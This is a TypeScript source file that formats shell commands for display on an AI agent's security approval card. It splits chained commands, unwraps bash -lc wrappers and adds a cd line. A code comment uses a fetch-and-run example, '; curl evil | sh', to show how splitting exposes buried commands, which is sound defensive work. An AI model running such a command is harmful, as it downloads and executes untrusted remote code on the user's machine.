// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps. It is deliberately optimistic: it
// only tracks quotes and backslash escapes, not the full shell grammar, and a
// command that already contains newlines is left exactly as written.
//
// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
// character, so every byte of the original command is still shown in the same
// order (just with extra line breaks). That property is what makes it safe to use
// on the security approval card - the text a user approves is byte-for-byte the
// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
// spot, never harder.
export function splitBashChains(cmd: string): string {
  if (cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    out += ch
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) continue
    // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
    // second character. A single `|` (pipe) or `&` (background/redirect) does
    // not.
    const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) continue
    if (ch !== ';') out += cmd[++i]
    while (cmd[i + 1] === ' ') i++
    if (i + 1 < cmd.length) out += '\n'
  }
  return out
}

// Codex reports shell commands as the argv-style launcher it executed, commonly
// `/usr/bin/bash -lc '<script>'`. The wrapper is implementation detail, so show
// the script itself while retaining the untouched item behind the tool card's
// Raw toggle. App-server also reports the equivalent `-c` form and, depending
// on platform/launch path, spells the executable as bash, /bin/bash, or
// /usr/bin/bash. Unquoted remainders are accepted because this is a display
// formatter for the provider's command string, not an argv parser.
export function unwrapBashLoginCommand(command: string): string {
  const match = command.match(/^(?:\/usr\/bin\/|\/bin\/)?bash\s+-(?:l)?c\s+([\s\S]+)$/)
  if (!match) return command
  const arg = match[1].trim()
  if (!arg) return command
  if (arg[0] === "'" && arg.at(-1) === "'") {
    return arg.slice(1, -1).replace(/'"'"'/g, "'")
  }
  if (arg[0] === '"' && arg.at(-1) === '"') {
    return arg.slice(1, -1).replace(/\\([\\"$`])/g, '$1').replace(/\\\n/g, '')
  }
  return arg
}

function quoteShellPath(path: string): string {
  return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
}

export function formatBashForDisplay(command: string, cwd?: string): string {
  const script = splitBashChains(unwrapBashLoginCommand(command))
  if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
  return `cd ${quoteShellPath(cwd)}\n${script}`
}
